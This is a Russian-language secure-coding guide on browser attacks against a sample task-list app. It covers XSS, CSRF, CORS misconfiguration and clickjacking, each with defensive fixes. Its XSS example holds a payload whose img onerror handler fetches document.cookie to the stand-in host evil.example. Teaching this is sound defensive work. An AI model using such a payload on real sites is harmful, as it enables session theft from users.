# Атаки на браузер и пользователя

В «Задачнике» пользователи сами пишут названия задач и комментарии, а сервер показывает их другим людям. Стоит один раз вставить такой текст в HTML как есть — и название задачи `<script>...</script>` выполнится в браузере каждого, кто откроет список. Это XSS, самая частая из атак, в которых мишень не сервер, а браузер пользователя. Рядом с ней стоят CSRF (браузер сам отправляет запрос от имени пользователя), неправильный CORS (чужой сайт читает ответы API) и clickjacking (пользователя заставляют нажать кнопку на невидимой странице). Общее у них одно: сервер делает всё «правильно», а атака проходит через доверие браузера к сайту.

## Минимальный пример

Уязвимый и исправленный вывод названия задачи в HTML:

```python run
import html

title = 'Купить хлеб <img src=x onerror="fetch(\'https://evil.example/?c=\' + document.cookie)">'

# уязвимо: текст пользователя попадает в разметку как есть
unsafe = f'<li class="task">{title}</li>'
print(unsafe)
# <li class="task">Купить хлеб <img src=x onerror="fetch('https://evil.example/?c=' + document.cookie)"></li>

# исправлено: спецсимволы заменены на сущности, браузер видит текст, а не тег
safe = f'<li class="task">{html.escape(title)}</li>'
print(safe)
# <li class="task">Купить хлеб &lt;img src=x onerror=&quot;fetch(&#x27;https://evil.example/?c=&#x27; + document.cookie)&quot;&gt;</li>
```

В первом случае браузер создаст элемент `<img>`, не сможет загрузить картинку `x` и выполнит `onerror` — cookie пользователя уйдут на чужой домен. Во втором браузер покажет строку с угловыми скобками как обычный текст. Шаблонизаторы (Jinja2, шаблоны Django и Vue) делают то же экранирование автоматически, пока его не отключили явно.

## Как это работает

### XSS

Cross-Site Scripting возникает, когда недоверенные данные попадают в HTML, JavaScript, CSS или URL без безопасного кодирования. Скрипт выполняется с правами сайта и может читать доступные данные или выполнять действия от имени пользователя.

Три разновидности:

- **отражённая** — вредоносный текст приходит в запросе (например, в параметре поиска) и тут же возвращается в странице: жертве присылают ссылку;
- **хранимая** — текст сохранён в базе (название задачи, комментарий) и показывается всем, кто его открывает;
- **DOM-based** — страница сама вставляет данные из URL или ответа API через `innerHTML`, сервер в этом не участвует.

Экранирование зависит от **контекста вывода**: внутри тега нужно заменить `<`, `>`, `&`, `"`, в атрибуте — ещё и кавычки, в JavaScript-строке и URL — свои правила. Поэтому одна функция «очистки» на входе не спасает: данные сохраняют как есть, а кодируют в момент вывода тем способом, который подходит контексту.

Защита:

- использовать автоэкранирование шаблонов и не вставлять сырой HTML;
- очищать HTML по allowlist (библиотеки вроде `nh3` или `bleach`), если разметка действительно нужна;
- применять [CSP](security_headers.md) как дополнительный слой: даже выполнившийся скрипт не сможет отправить данные на чужой домен;
- помечать сессионные cookies `HttpOnly`, чтобы `document.cookie` их не видел;
- не считать фильтрацию отдельных строк (`<script>`) достаточной защитой: обходов сотни.

См. также [безопасное использование `v-html`](../../../frontend/vue/v_html.md).

### CSRF

Cross-Site Request Forgery заставляет браузер авторизованного пользователя отправить нежелательный запрос. Риск возникает, когда браузер автоматически прикладывает cookies или другие учётные данные.

Пример: Анна вошла в «Задачник», сессия лежит в cookie. На чужом сайте есть форма:

```http
POST /tasks/42/delete HTTP/1.1
Host: tasker.ru
Cookie: session=...        ← браузер приложит сам
Origin: https://evil.example
Content-Type: application/x-www-form-urlencoded
```

Сервер видит правильную cookie и удаляет задачу. Исправленный вариант отличает «запрос с нашей страницы» от «запроса с чужой»: в форму вставляется случайный токен, которого у чужого сайта нет, и сервер проверяет его вместе с `Origin`:

```python
import hmac


def csrf_ok(request, session) -> bool:
    origin_ok = request.headers.get('Origin') in {'https://tasker.ru'}
    token_ok = hmac.compare_digest(request.form.get('csrf_token', ''), session['csrf_token'])
    return origin_ok and token_ok
```

Защита:

- CSRF-токены для изменяющих состояние запросов (фреймворки делают это сами: `CsrfViewMiddleware` в Django, `starlette-csrf` для FastAPI);
- `SameSite=Lax` или `Strict` на cookie сессии, когда это совместимо со сценарием: браузер не приложит cookie к запросу с чужого сайта;
- проверка `Origin`, а при необходимости `Referer`;
- запрет изменяющих операций через `GET`;
- повторная аутентификация для критичных действий (смена пароля, удаление аккаунта).

Если API работает по токену в заголовке `Authorization`, а не по cookie, CSRF ему не грозит: чужой сайт не может заставить браузер добавить этот заголовок.

### CORS

CORS определяет, каким origin браузер разрешает **читать** ответ. Запрос при этом всё равно уходит на сервер, а для «нестандартных» запросов браузер сначала посылает preflight-запрос `OPTIONS`. Это не механизм аутентификации и не защита серверного API от запросов вне браузера: `curl` заголовки CORS не читает.

Опасная комбинация — отражать любой `Origin` и разрешать credentials:

```http
Access-Control-Allow-Origin: https://evil.example   ← скопирован из запроса
Access-Control-Allow-Credentials: true
```

Так чужой сайт читает ответы API с cookie пользователя. Правильно — список конкретных доверенных origin и `Allow-Credentials` только для них; `*` допустим лишь для публичного API без cookie.

### Clickjacking

Сайт помещают в невидимый или замаскированный `iframe`, побуждая пользователя нажать на элементы интерфейса: под кнопкой «Получить приз» оказывается кнопка «Удалить аккаунт» «Задачника». Защита: CSP `frame-ancestors` и, для старых клиентов, `X-Frame-Options` — см. [защитные заголовки](security_headers.md).

## Частые ошибки

- **Автоэкранирование отключено ради одного поля.** `{{ text | safe }}` в Jinja2, `mark_safe` в Django или `v-html` во Vue без очистки по allowlist — готовая хранимая XSS.
- **Данные экранированы для HTML, но вставлены в JavaScript.** `<script>var title = "{{ title }}"</script>` ломается кавычкой. Передавайте данные через `data-`-атрибуты или `json.dumps` с экранированием `</`.
- **Проверка только `Referer`.** Браузеры и расширения его режут, а с `Referrer-Policy: no-referrer` он пуст. Основная проверка — токен и `Origin`.
- **`SameSite` вместо токена.** Старые браузеры не знают атрибут, а `Lax` пропускает `GET` с переходом по ссылке. Это дополнительный слой, а не единственный.
- **Отражение `Origin` в `Access-Control-Allow-Origin`.** Удобно для разработки, но в продакшене равносильно отключению CORS с передачей cookie.
- **Сессия без `HttpOnly`.** Любая XSS сразу превращается в кражу сессии.

## Когда не использовать

CSRF-токены не нужны API, которое принимает только `Authorization: Bearer` и не читает cookie: браузер не добавит заголовок сам, и чужой сайт не отправит аутентифицированный запрос. Добавлять их туда — лишняя сложность для мобильных клиентов и других сервисов.

Строгий CORS лишний для публичного API без учётных данных (курсы валют, открытая документация): `Access-Control-Allow-Origin: *` без credentials ничего не раскрывает.

Очистка HTML по allowlist нужна только там, где пользователь действительно вводит разметку (редактор описания задачи). Для названий, комментариев и имён достаточно обычного экранирования — оно проще и не имеет обходов.
